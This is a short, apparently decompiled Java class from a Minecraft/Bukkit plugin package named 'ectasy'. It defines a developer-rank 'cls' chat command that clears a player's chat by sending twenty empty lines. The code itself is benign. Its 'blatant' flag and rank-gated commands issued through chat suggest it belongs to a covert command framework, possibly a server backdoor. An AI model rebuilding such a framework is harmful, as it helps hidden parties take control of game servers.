package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "cls",
   description = "Clears chat",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {}
)
public class ClearCharCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      for (int i = 0; i < 20; i++) {
         e.getPlayer().sendMessage("");
      }
   }
}
